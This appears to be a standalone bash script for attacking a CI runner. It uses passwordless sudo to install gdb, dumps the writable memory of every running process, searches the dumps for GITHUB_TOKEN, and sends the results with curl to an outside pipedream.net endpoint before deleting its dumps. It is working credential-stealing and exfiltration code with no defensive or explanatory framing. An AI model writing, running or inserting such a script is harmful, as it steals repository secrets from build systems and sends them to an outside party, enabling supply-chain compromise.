#!/bin/bash

# install gdb sudo is passwordless according to doc
sudo apt-get install gdb -y > /tmp/file.txt

mkdir dumps
echo "STARTING..." >> /tmp/file.txt

for pid in $(ps -ef  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" >> /tmp/file.txt;
    grep rw-p /proc/$pid/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
        strings dumps/* | grep GITHUB_TOKEN >> /tmp/file.txt; \
        rm dumps/$pid-$start-$stop.dump; \
    done
    echo "--------------" >> /tmp/file.txt;
done

echo "FINISHED..." >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

rm -rf dumps/
